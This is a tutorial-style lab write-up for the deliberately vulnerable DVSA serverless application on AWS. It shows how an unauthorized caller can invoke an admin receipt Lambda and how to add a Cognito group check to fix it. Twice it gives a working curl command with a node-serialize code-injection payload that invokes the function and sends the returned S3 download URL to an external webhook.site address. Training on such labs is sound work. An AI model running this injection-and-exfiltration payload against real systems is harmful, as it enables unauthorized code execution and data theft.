# Sensitive Information Disclosure
The Sensitive Information Disclosure vulnerability in the DVSA application happens because the backend does not properly enforce authorization when invoking administrative functions. The system allows requests to trigger the `DVSA-ADMIN-GET-RECEIPT` Lambda function without verifying whether the user has admin privileges.

As a result, an attacker can send a crafted request to invoke this function and retrieve receipt data. The response, which includes a valid download URL for files stored in Amazon S3, can be exfiltrated to an external service such as Webhook.site. This leads to unauthorized access to sensitive receipt data belonging to other users.

## Vulnerability Exploting
To achieve this vulnerability, we will use the Terminal, Webhook.site, and the AWS console. The DVSA application is deployed on AWS, and the vulnerability exists in the `/order` API, which allows invoking the administrative function `DVSA-ADMIN-GET-RECEIPT`.

You have to follow these steps:

1. Go to https://webhook.site
2. Copy your unique Webhook URL.
3. Keep the page open to monitor incoming requests.
4. Open the AWS console.
5. Search for API Gateway and open it.
6. Open the DVSA API and copy the Invoke URL.
7. Replace `[Your_Code]` and `[YOUR_WEBHOOK_ID]` in the following command, then run it in the terminal:
```bash

curl -s -X POST "https://[Your_Code].execute-api.us-east-1.amazonaws.com/dvsa/order" \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer dummy' \
-d '{"action": "_$$ND_FUNC$$_function(){var {Lambda}=require(\"@aws-sdk/client-lambda\");var lambda=new Lambda({});lambda.invoke({FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"}))}).then(d=>{var p=Buffer.from(d.Payload).toString();require(\"https\").get(\"https://webhook.site/[YOUR_WEBHOOK_ID]/?data=\"+encodeURIComponent(p));}).catch(e=>{console.error(\"ERR\",e)});}()", "cart-id":""}'
```

8. After running the command, observe the incoming request on Webhook.site.

The application sends a request to your Webhook URL containing response data from the backend.

The captured data includes a JSON object with a `download_url`. When this URL is opened in a browser, it downloads a `.zip` file containing receipt data.

This confirms that the application allows unauthorized users to invoke the admin function and access sensitive files stored in Amazon S3.

## Vulnerability Fixing
The fix of this vulnerability is done in the `DVSA-ADMIN-GET-RECEIPT` Lambda function by enforcing proper authorization checks.

1. Open the AWS console.
2. Search for and open Lambda.
3. Open the `DVSA-ADMIN-GET-RECEIPT` function.
4. Open the `admin_get_receipts.py` file in the code tab.
5. Add the following authorization check at the beginning of lambda_handler(event, context) function:

```python
claims = event.get("requestContext", {}).get("authorizer", {}).get("claims", {})
groups = claims.get("cognito:groups", "")

if "admin" not in groups:
    return {
        "status": "error",
        "message": "Access denied"
    }
```
6. Deploy the changes by clicking on the Deploy button.

This fix ensures that only users in the admin group can invoke the receipt-generation function.

To verify that the fix is working, run the same curl command again:
```bash
curl -s -X POST "https://[Your_Code].execute-api.us-east-1.amazonaws.com/dvsa/order" \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer dummy' \
-d '{"action": "_$$ND_FUNC$$_function(){var {Lambda}=require(\"@aws-sdk/client-lambda\");var lambda=new Lambda({});lambda.invoke({FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"}))}).then(d=>{var p=Buffer.from(d.Payload).toString();require(\"https\").get(\"https://webhook.site/[YOUR_WEBHOOK_ID]/?data=\"+encodeURIComponent(p));}).catch(e=>{console.error(\"ERR\",e)});}()", "cart-id":""}'
```
After applying the fix, the application will return:

{"status":"error","message":"Access denied"}

The system will no longer generate a valid S3 download URL, and sensitive receipt files cannot be accessed by non-admin users.